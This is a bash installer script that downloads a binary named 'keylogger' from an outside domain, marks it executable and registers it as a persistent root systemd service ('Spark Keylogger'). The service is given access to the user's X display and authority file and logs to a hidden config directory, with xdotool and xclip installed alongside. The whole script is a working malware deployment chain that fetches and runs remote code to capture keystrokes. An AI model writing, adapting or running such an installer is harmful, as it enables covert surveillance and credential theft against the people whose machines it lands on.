#!/bin/bash

# Ensure the script is run with sudo
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run with sudo privileges. Exiting."
    exit 1
fi

# Variables
APP_URL="https://panakeos.icu/app/u64/keylogger"
ORIGINAL_USER=$(logname)
ORIGINAL_HOME=$(eval echo "~$ORIGINAL_USER")
CONFIG_DIR="$ORIGINAL_HOME/.config/spark"
BINARY_PATH="$CONFIG_DIR/keylogger"
LOG_FILE="$CONFIG_DIR/keylogger.log"
SERVICE_NAME="spark-keylogger"
SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"
DISPLAY_ENV=${DISPLAY:-:0}

export DISPLAY=:0
export XAUTHORITY=$HOME/.Xauthority


echo "Detected user: $ORIGINAL_USER"
echo "Detected home directory: $ORIGINAL_HOME"
echo "Detected display: $DISPLAY_ENV"

# Step 1: Create Configuration Directory
echo "Creating configuration directory at $CONFIG_DIR..."
sudo -u "$ORIGINAL_USER" mkdir -p "$CONFIG_DIR"
if [ $? -ne 0 ]; then
    echo "Error: Failed to create configuration directory. Exiting."
    exit 1
fi


XAUTH_FILE="${ORIGINAL_HOME}/.Xauthority"

# Check if .Xauthority file exists
if [ -f "${XAUTH_FILE}" ]; then
    echo ".Xauthority file exists at ${XAUTH_FILE}"
else
    echo ".Xauthority file not found. Generating one..."
    # Generate a new .Xauthority file
    touch $XAUTH_FILE;
    xauth generate :0 . trusted
    if [ $? -eq 0 ]; then
        echo ".Xauthority file generated successfully."
    else
        echo "Failed to generate .Xauthority file. Ensure xauth is installed and DISPLAY=:0 is set."
        exit 1
    fi
fi

# Step 2: Download the Binary File
echo "Downloading the binary file from $APP_URL..."
sudo -u "$ORIGINAL_USER" curl -fsSL -o "$BINARY_PATH" "$APP_URL"
if [ $? -ne 0 ]; then
    echo "Error: Failed to download the binary file. Exiting."
    exit 1
fi

# Step 3: Make the Binary Executable
echo "Making the binary executable..."
sudo -u "$ORIGINAL_USER" chmod +x "$BINARY_PATH"
if [ $? -ne 0 ]; then
    echo "Error: Failed to make the binary executable. Exiting."
    exit 1
fi

# Step 4: Install Dependencies
echo "Installing dependencies..."
apt install -y xdotool xclip
if [ $? -ne 0 ]; then
    echo "Error: Failed to install dependencies. Exiting."
    exit 1
fi

# Step 5: Create or Update Systemd Service File
echo "Creating systemd service file at $SERVICE_FILE..."
cat <<EOL | tee "$SERVICE_FILE" > /dev/null
[Unit]
Description=Spark Keylogger Service
After=network.target

[Service]
Type=simple
ExecStart=$BINARY_PATH $ORIGINAL_HOME
Restart=on-failure
Environment=DISPLAY=$DISPLAY_ENV
Environment=XAUTHORITY=$ORIGINAL_HOME/.Xauthority
StandardOutput=append:$ORIGINAL_HOME/.config/spark/keylogger.log
StandardError=append:$ORIGINAL_HOME/.config/spark/keylogger.log
Environment=HOME=/root
User=root

[Install]
WantedBy=multi-user.target
EOL

if [ $? -ne 0 ]; then
    echo "Error: Failed to create the service file. Exiting."
    exit 1
fi

# Step 6: Reload and Restart the Service
echo "Reloading systemd daemon..."
systemctl daemon-reload

echo "Stopping the $SERVICE_NAME service (if running)..."
systemctl stop $SERVICE_NAME

echo "Starting the updated $SERVICE_NAME service..."
systemctl start $SERVICE_NAME

# Step 7: Verify the Updated Service
echo "Verifying $SERVICE_NAME service status..."
systemctl status $SERVICE_NAME

echo "Setup completed successfully!"
